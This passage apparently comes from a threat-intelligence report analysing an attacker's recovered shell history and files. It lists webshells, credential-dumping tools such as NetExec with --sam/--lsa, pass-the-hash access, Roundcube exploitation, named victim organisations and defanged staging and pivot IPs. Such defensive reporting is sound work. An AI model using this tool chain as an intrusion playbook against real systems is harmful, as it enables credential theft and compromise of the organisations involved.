- Shell history documents concurrent operations: Neo-reGeorg, reGeorg, and suo5 webshells against Exchange servers in the US 🇺🇸 and Europe; post-exploitation with evil-winrm, dploot, donpapi, and NetExec (nxc --sam/--lsa) against a US 🇺🇸 target; NTLM hash-based SMB access and DPAPI extraction against a German 🇩🇪 organization; CVE-2025-49113 Roundcube exploitation against a Ukrainian 🇺🇦 freemail provider; S3 backup access via Restic with AWS credentials; git-dumper commands against Aerorozvidka, UkrSpecSystems, and Skyeton (success unconfirmed); and a 1.03 GB Czech 🇨🇿 backup archive (AutomBackupCZ[.]zip) recovered directly. A staging server at 129.146.87[.]174:18080 hosted exploit scripts with randomized six-character path segments. SSH pivots ran through 103.28.71[.]82 (Netherlands 🇳🇱), 108.175.14[.]121 (US 🇺🇸), 122.155.11[.]107 (Thailand 🇹🇭), and 144.91.77[.]125 (France 🇫🇷), two using non-root usernames on hosts with educational institution TLS certificates.
- The 422 unrecovered files are the investigation's sharpest intelligence gap: .sliver/sliver.db (Sliver v1.7.3 C2 deployed July 21, 2026, five days before discovery), .ssh/known_hosts and authorized_keys, it/pwned_golden.ccache (Kerberos golden ticket, victim domain SID and krbtgt hash unrecovered), .donpapi/donpapi.db, Responder/Responder.db, hashlist, wg0-client-LinuxDataShare.conf (WireGuard config, most-visited directory at 76 zoxide hits), key.pvk (Windows code-signing private key), and .kimi/device_id plus .jcode telemetry session GUID 648862ba-e9c9-48d0-93e1-d447cf850695.
